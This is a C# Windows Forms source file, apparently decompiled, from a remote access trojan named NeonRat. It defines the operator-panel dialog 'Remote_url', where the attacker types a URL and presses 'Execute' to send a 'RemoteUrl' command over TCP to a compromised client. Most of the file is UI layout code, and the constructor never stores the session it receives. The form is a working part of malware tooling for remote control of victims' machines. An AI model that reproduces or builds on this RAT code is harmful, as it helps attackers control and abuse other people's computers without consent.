using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Siticone.Desktop.UI.WinForms;
using Sockets;
using ZEDRAT.TCP;

namespace NeonRat.Forms
{
	public class Remote_url : Form
	{
		private readonly string strHostIPAddress;

		private TcpClientSession _tcs;

		private IContainer components;

		private SiticoneHtmlLabel SiticoneHtmlLabel1;

		private SiticoneHtmlLabel SiticoneHtmlLabel12;

		public Button btnUpdate;

		private BunifuTextBox textBox1;

		private MetroSetControlBox metroSetControlBox1;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_url(string strHostIPAddress, TcpClientSession tcs)
		{
			this.InitializeComponent();
		}

		private void button1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = this.textBox1.Text;
				if (string.IsNullOrEmpty(text))
				{
					throw new Exception();
				}
				this._tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("RemoteUrl" + text));
			}
			catch
			{
			}
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_url.ReleaseCapture();
			Remote_url.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void Remote_url_MouseDown(object sender, MouseEventArgs e)
		{
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
															this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(NeonRat.Forms.Remote_url));
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			this.SiticoneHtmlLabel1 = new SiticoneHtmlLabel();
			this.SiticoneHtmlLabel12 = new SiticoneHtmlLabel();
			this.btnUpdate = new System.Windows.Forms.Button();
			this.textBox1 = new Bunifu.UI.WinForms.BunifuTextBox();
			this.metroSetControlBox1 = new MetroSet_UI.Controls.MetroSetControlBox();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			base.SuspendLayout();
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel1).BackColor = System.Drawing.Color.Transparent;
			this.SiticoneHtmlLabel1.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel1).Location = new System.Drawing.Point(69, 60);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel1).Name = "SiticoneHtmlLabel1";
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel1).Size = new System.Drawing.Size(67, 15);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel1).TabIndex = 0;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel1).Text = "Visit Website:";
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).BackColor = System.Drawing.Color.Transparent;
			this.SiticoneHtmlLabel12.Font = new System.Drawing.Font("Gotham Book", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.SiticoneHtmlLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Location = new System.Drawing.Point(252, 12);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Name = "SiticoneHtmlLabel12";
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Size = new System.Drawing.Size(107, 20);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).TabIndex = 40;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Text = "Visit Website";
			this.btnUpdate.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.btnUpdate.BackgroundImage = (System.Drawing.Image)resources.GetObject("btnUpdate.BackgroundImage");
			this.btnUpdate.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.btnUpdate.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.btnUpdate.FlatAppearance.BorderSize = 0;
			this.btnUpdate.FlatAppearance.CheckedBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.btnUpdate.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.btnUpdate.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.btnUpdate.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
			this.btnUpdate.Font = new System.Drawing.Font("Century Gothic", 11.25f);
			this.btnUpdate.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.btnUpdate.Location = new System.Drawing.Point(413, 136);
			this.btnUpdate.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			this.btnUpdate.Name = "btnUpdate";
			this.btnUpdate.Size = new System.Drawing.Size(158, 44);
			this.btnUpdate.TabIndex = 93;
			this.btnUpdate.Text = "Execute";
			this.btnUpdate.UseVisualStyleBackColor = true;
			this.btnUpdate.Click += new System.EventHandler(button1_Click);
			this.textBox1.AcceptsReturn = false;
			this.textBox1.AcceptsTab = false;
			this.textBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.textBox1.AnimationSpeed = 200;
			this.textBox1.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
			this.textBox1.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
			this.textBox1.AutoSizeHeight = true;
			this.textBox1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("textBox1.BackgroundImage");
			this.textBox1.BorderColorActive = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox1.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
			this.textBox1.BorderColorHover = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox1.BorderColorIdle = System.Drawing.Color.FromArgb(226, 28, 71);
			this.textBox1.BorderRadius = 1;
			this.textBox1.BorderThickness = 1;
			this.textBox1.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
			this.textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox1.DefaultFont = new System.Drawing.Font("Century Gothic", 11.25f);
			this.textBox1.DefaultText = "";
			this.textBox1.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox1.HideSelection = true;
			this.textBox1.IconLeft = null;
			this.textBox1.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox1.IconPadding = 10;
			this.textBox1.IconRight = null;
			this.textBox1.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox1.Lines = new string[0];
			this.textBox1.Location = new System.Drawing.Point(69, 75);
			this.textBox1.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			this.textBox1.MaxLength = 32767;
			this.textBox1.MinimumSize = new System.Drawing.Size(2, 2);
			this.textBox1.Modified = false;
			this.textBox1.Multiline = false;
			this.textBox1.Name = "textBox1";
			stateProperties.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties.FillColor = System.Drawing.Color.Empty;
			stateProperties.ForeColor = System.Drawing.Color.Empty;
			stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox1.OnActiveState = stateProperties;
			stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
			stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
			stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
			stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
			this.textBox1.OnDisabledState = stateProperties2;
			stateProperties3.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties3.FillColor = System.Drawing.Color.Empty;
			stateProperties3.ForeColor = System.Drawing.Color.Empty;
			stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox1.OnHoverState = stateProperties3;
			stateProperties4.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			stateProperties4.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties4.ForeColor = System.Drawing.Color.Empty;
			stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox1.OnIdleState = stateProperties4;
			this.textBox1.Padding = new System.Windows.Forms.Padding(3, 4, 3, 4);
			this.textBox1.PasswordChar = '\0';
			this.textBox1.PlaceholderForeColor = System.Drawing.Color.Silver;
			this.textBox1.PlaceholderText = "URL";
			this.textBox1.ReadOnly = false;
			this.textBox1.ScrollBars = System.Windows.Forms.ScrollBars.None;
			this.textBox1.SelectedText = "";
			this.textBox1.SelectionLength = 0;
			this.textBox1.SelectionStart = 0;
			this.textBox1.ShortcutsEnabled = true;
			this.textBox1.Size = new System.Drawing.Size(422, 44);
			this.textBox1.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Material;
			this.textBox1.TabIndex = 94;
			this.textBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
			this.textBox1.TextMarginBottom = 0;
			this.textBox1.TextMarginLeft = 3;
			this.textBox1.TextMarginTop = 1;
			this.textBox1.TextPlaceholder = "URL";
			this.textBox1.UseSystemPasswordChar = false;
			this.textBox1.WordWrap = true;
			this.metroSetControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.metroSetControlBox1.CloseHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.CloseHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.CloseNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.DisabledForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.IsDerivedStyle = true;
			this.metroSetControlBox1.Location = new System.Drawing.Point(511, 1);
			this.metroSetControlBox1.MaximizeBox = true;
			this.metroSetControlBox1.MaximizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MaximizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MaximizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.MinimizeBox = true;
			this.metroSetControlBox1.MinimizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MinimizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MinimizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.Name = "metroSetControlBox1";
			this.metroSetControlBox1.Size = new System.Drawing.Size(100, 25);
			this.metroSetControlBox1.Style = MetroSet_UI.Enums.Style.Custom;
			this.metroSetControlBox1.StyleManager = null;
			this.metroSetControlBox1.TabIndex = 160;
			this.metroSetControlBox1.Text = "metroSetControlBox1";
			this.metroSetControlBox1.ThemeAuthor = "Narwin";
			this.metroSetControlBox1.ThemeName = "MetroLite";
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(611, 203);
			base.Controls.Add(this.metroSetControlBox1);
			base.Controls.Add(this.textBox1);
			base.Controls.Add(this.btnUpdate);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel1);
			this.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Remote_url";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Remote_url";
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(Remote_url_MouseDown);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
